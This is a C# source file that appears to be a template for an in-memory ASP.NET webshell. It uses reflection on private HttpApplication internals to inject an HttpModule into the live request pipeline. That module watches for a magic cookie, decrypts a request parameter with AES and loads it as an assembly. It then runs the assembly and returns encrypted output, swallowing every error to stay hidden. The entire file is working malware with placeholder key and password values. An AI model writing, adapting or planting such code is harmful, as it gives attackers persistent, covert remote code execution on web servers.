using System;
using System.Collections;
using System.IO;
using System.Reflection;
using System.Runtime.Remoting.Contexts;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Web;
using System.Web.Caching;


public class TemplateY
{
    public TemplateY()
    {
        try
        {
            System.Web.HttpContext Context = System.Web.HttpContext.Current;
            Context.Server.ClearError();
            Context.Response.Clear();
            //Thread.Sleep(10000);
            HttpApplication currentApplication = HttpContext.Current.ApplicationInstance;
            // private static Hashtable _moduleIndexMap
            Type typeHttpApplication = typeof(HttpApplication);
            FieldInfo _moduleIndexMap = typeHttpApplication.GetField("_moduleIndexMap", BindingFlags.Static | BindingFlags.NonPublic);
            object _moduleIndexMapValue = _moduleIndexMap.GetValue(null);

            // private PipelineModuleStepContainer[] _moduleContainers
            FieldInfo _moduleContainers = typeHttpApplication.GetField("_moduleContainers", BindingFlags.NonPublic | BindingFlags.Instance);
            object _moduleContainersValue = _moduleContainers.GetValue(currentApplication);

            Assembly assemblySystemWeb = typeof(System.Web.HttpApplication).Assembly;
            Type typePipelineModuleStepContainer = assemblySystemWeb.GetType("System.Web.PipelineModuleStepContainer");
            FieldInfo _moduleSteps = typePipelineModuleStepContainer.GetField("_moduleSteps", BindingFlags.NonPublic | BindingFlags.Instance);


            int _moduleContainersValueCount = ((Array)_moduleContainersValue).Length;
            for (int i = 0; i < _moduleContainersValueCount; i++)
            {
                var _currentModuleContainers = ((Array)_moduleContainersValue).GetValue(i);
                Array _moduleStepsValue = (Array)_moduleSteps.GetValue(_currentModuleContainers);
                if (_moduleStepsValue == null || _moduleStepsValue.Length == 0)
                {
                    continue;
                }

                string destModuleName = GetHashtable(((Hashtable)_moduleIndexMapValue), i);
                if(String.IsNullOrEmpty(destModuleName))
                {
                    continue;
                }

                Add(currentApplication, destModuleName);

            }
        }
        catch (Exception e)
        {
            return;
        }


    }



    static private void Add(HttpApplication httpApplication, string moduleName)
    {
        try
        {
            Type typeHttpApplication = typeof(HttpApplication);

            FieldInfo _initInternalCompleted = typeHttpApplication.GetField("_initInternalCompleted", BindingFlags.NonPublic | BindingFlags.Instance);
            object _initInternalCompletedValue = _initInternalCompleted.GetValue(httpApplication);
            _initInternalCompleted.SetValue(httpApplication, false);

            FieldInfo _currentModuleCollectionKey = typeHttpApplication.GetField("_currentModuleCollectionKey", BindingFlags.Instance | BindingFlags.NonPublic);
            object _currentModuleCollectionKeyValue = _currentModuleCollectionKey.GetValue(httpApplication);
            _currentModuleCollectionKey.SetValue(httpApplication, moduleName);

            TemplateHttpModule myModule = new TemplateHttpModule();
            if (myModule != null)
            {
                ((IHttpModule)myModule).Init(httpApplication);
            }
            _initInternalCompleted.SetValue(httpApplication, true);
            _currentModuleCollectionKey.SetValue(httpApplication, _currentModuleCollectionKeyValue);
        }
        catch (Exception)
        {
            return;
        }
        
    }

    static public string GetHashtable(Hashtable hash, object targetValue)
    {
        foreach (DictionaryEntry entry in hash)
        {
            if (entry.Value.Equals(targetValue))
            {
                return (string)entry.Key;
            }
        }
        return null;
    }

}

public class TemplateHttpModule : IHttpModule
{
    public void Dispose()
    {
        // Clear resource
    }
    public void Init(HttpApplication context)
    {
        try
        {

            context.BeginRequest += OnEvent;
            context.AuthenticateRequest += OnEvent;
            context.PostAuthenticateRequest += OnEvent;
            context.AuthorizeRequest += OnEvent;
            context.PostAuthorizeRequest += OnEvent;
            context.ResolveRequestCache += OnEvent;
            context.PostMapRequestHandler += OnEvent;
            context.AcquireRequestState += OnEvent;
            context.PostAcquireRequestState += OnEvent;
            context.PreRequestHandlerExecute += OnEvent;
            context.PostRequestHandlerExecute += OnEvent;
            context.ReleaseRequestState += OnEvent;
            context.PostReleaseRequestState += OnEvent;
            context.UpdateRequestCache += OnEvent;
            context.PostUpdateRequestCache += OnEvent;
            context.LogRequest += OnEvent;
            context.PostLogRequest += OnEvent;
            context.EndRequest += OnEvent;
            /*
            Type httpCContyextType = typeof(HttpContext);
            EventInfo[] events = httpCContyextType.GetEvents(BindingFlags.Public|BindingFlags.Instance);

            foreach (EventInfo evt in events)
            {
                Type eventType = evt.EventHandlerType;
                Delegate handler = Delegate.CreateDelegate(eventType,this,"OnEvent");
                evt.AddEventHandler(context, handler);
            }
*/



        }
        catch (Exception e)
        {
            return;
        }
        // Register Event Handler

    }
    private string _key = "kkkkkkkkkk";
    private string _pass = "pppppppppp";

    private void Start(HttpContext ctx)
    {
        try
        {
            string _internalKey = System.BitConverter.ToString(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.Default.GetBytes(_key))).Replace("-", "").ToLower().Substring(0, 16);
            string _md5 = BitConverter.ToString(new MD5CryptoServiceProvider().ComputeHash(Encoding.Default.GetBytes(_pass + _internalKey))).Replace("-", "");
            byte[] data = Convert.FromBase64String(ctx.Request[_pass]);
            data = new RijndaelManaged().CreateDecryptor(Encoding.Default.GetBytes(_internalKey), Encoding.Default.GetBytes(_internalKey)).TransformFinalBlock(data, 0, data.Length);
            if (HttpRuntime.Cache["Awsgfse"] == null)
            {
                HttpRuntime.Cache.Insert("Awsgfse", (Assembly)typeof(Assembly).GetMethod("Load", new Type[]
                {
                typeof(byte[])
                }).Invoke(null, new object[]
                {
                data
                }), null, Cache.NoAbsoluteExpiration, new TimeSpan(0, 20, 0));
            }
            else
            {
                MemoryStream memoryStream = new MemoryStream();
                object obj = ((Assembly)HttpRuntime.Cache["Awsgfse"]).CreateInstance("LY");
                obj.Equals(ctx);
                obj.Equals(memoryStream);
                obj.Equals(data);
                obj.ToString();
                byte[] array2 = memoryStream.ToArray();
                ctx.Response.Clear();
                ctx.Response.Write(_md5.Substring(0, 16));
                ctx.Response.Write(Convert.ToBase64String(
                    new RijndaelManaged().CreateEncryptor(Encoding.Default.GetBytes(_internalKey),
                    Encoding.Default.GetBytes(_internalKey)).TransformFinalBlock(array2, 0, array2.Length)));
                ctx.Response.Write(_md5.Substring(16));
                ctx.Response.Flush();
                ctx.Response.End();
                ctx.Response.Close();
            }
        }
        catch (Exception)
        {
            return;
        }
        finally
        {
            ctx.ApplicationInstance.CompleteRequest();
        }

    }

    private int SelSvc(HttpCookieCollection cookieCol)
    {
        string[] allKeys = cookieCol.AllKeys;
        foreach (string name in allKeys)
        {
            if (cookieCol[name].Value.Equals("xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"))
            {
                return 9527;
            }
        }
        return 0;
    }

    private void OnEvent(object sender, EventArgs e)
    {

        HttpContext context = (sender as HttpApplication).Context;
        try
        {
            HttpCookieCollection cookies = context.Request.Cookies;
            switch (this.SelSvc(cookies))
            {
                case 9527:
                    this.Start(context);
                    break;
            }
        }
        catch (ThreadAbortException)
        {
            Thread.ResetAbort();
        }
        catch (Exception)
        {
            return;
        }
    }

}

